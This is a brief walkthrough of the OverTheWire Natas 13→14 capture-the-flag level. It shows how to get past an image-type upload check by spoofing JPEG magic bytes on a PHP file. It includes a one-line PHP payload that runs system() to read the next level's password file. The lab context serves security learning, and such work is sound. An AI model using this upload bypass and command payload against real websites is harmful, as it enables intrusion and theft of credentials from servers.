## Natas Level 13 → Level 14
- Go to url: http://natas13.natas.labs.overthewire.org
    - User: natas13

- It looks almost exactly the same as before
- But with one unfortunate bonus in the source code...
    - else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) { 
        echo "File is not an image";
    - It checks if it's an image!
- To bypass this we need to understand how file identification works
    - As it turns out, there are magic bytes at the start of every file which denote how it's interpreted
    - If we simply edit those magic bytes, we can trick the website into allowing us to submit a fake jpeg again
- Let's make a similar fake jpeg
    - echo "<?php echo system(\"cat /etc/natas_webpass/natas14\"); ?>" > totallyapicture.jpg
- Now to edit the magic bytes
    - First, let's insert 4 bytes using spaces
        - vim totallyapicture.jp
    - Next, let's turn those bytes into the correct magic bytes, which are easily found on wikipedia as FF D8 FF DB
        - hexedit totallyapicture.jp
    - And we should be all set!
- Submit and open the file like in the previous level
